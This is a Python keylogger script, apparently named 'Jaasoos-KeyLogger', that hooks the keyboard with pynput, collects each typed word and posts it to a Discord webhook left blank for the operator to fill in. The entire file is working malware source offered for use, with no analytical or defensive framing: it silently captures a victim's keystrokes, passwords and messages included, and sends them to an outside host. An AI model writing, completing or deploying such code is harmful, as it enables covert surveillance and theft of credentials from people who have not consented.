from pynput.keyboard import Key, Listener
import requests

keyboard_hook = '' # Your Discord Text Channel Webhook


chars = []


def onPress(key):
    if (key != Key.space):
        chars.append(str(key))
    else:
        sendWord(chars)


def sendWord(chars):
    # Joining the character from array and replacing '' with blank. like -> 'hi' -> hi
    word = ''.join(chars).replace("'", '')
    # Object of log data
    loggerData = {
        'content': word,
        'username': 'Jaasoos-KeyLogger'
    }
    # Sending message
    response = requests.post(keyboard_hook, json=loggerData)
    if response.status_code == 204:
        print('Message sent successfully.')
    else:
        print(f"Failed to send message. Status code: {response.status_code}")
    chars.clear()


while (exit != True):
    with Listener(on_press=onPress) as listener:
        listener.join()
